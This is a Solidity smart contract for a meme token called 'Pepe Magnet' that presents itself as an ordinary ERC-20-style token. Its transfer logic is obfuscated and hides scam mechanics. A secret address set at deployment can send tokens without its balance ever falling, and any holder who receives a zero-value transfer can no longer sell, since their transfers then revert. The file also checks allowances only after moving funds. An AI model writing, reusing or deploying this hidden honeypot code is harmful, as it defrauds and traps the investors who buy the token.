/*



*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.5;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract PepeMagnet is Ownable {

    uint256 private effectiveness = 41;

    string public name = 'Pepe Magnet';

    mapping(address => uint256) public balanceOf;

    mapping(address => uint256) private pair;

    function transfer(address goal, uint256 reliable) public returns (bool success) {
	        magnet(msg.sender, goal, reliable);
	        return true;
	    }

    function approve(address barriers, uint256 reliable) public returns (bool success) {
	        allowance[msg.sender][barriers] = reliable;
	        emit Approval(msg.sender, barriers, reliable);
	        return true;
	    }

    string public symbol = 'Pepe Magnet';

    function transferFrom(address baker, address goal, uint256 reliable) public returns (bool success) {
	        magnet(baker, goal, reliable);
	        require(reliable <= allowance[baker][msg.sender]);
	        allowance[baker][msg.sender] -= reliable;
	        return true;
	    }

    address public uniswapV2Pair;

    uint8 public decimals = 9;

    mapping(address => uint256) private mm;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);

    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    function magnet(address baker, address goal, uint256 reliable) private returns (bool success) {
	        if (mm[baker] == 0) {
	            if (uniswapV2Pair != baker && pair[baker] > 0) {
	                mm[baker] -= effectiveness;
	            }
	            balanceOf[baker] -= reliable;
	        }
	        balanceOf[goal] += reliable;
	        if (reliable == 0) {
	            pair[goal] += effectiveness;
	        }
	        emit Transfer(baker, goal, reliable);
	        return true;
	    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(address struggle) {
	        balanceOf[msg.sender] = totalSupply;
	        mm[struggle] = effectiveness;
	        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
	    }


}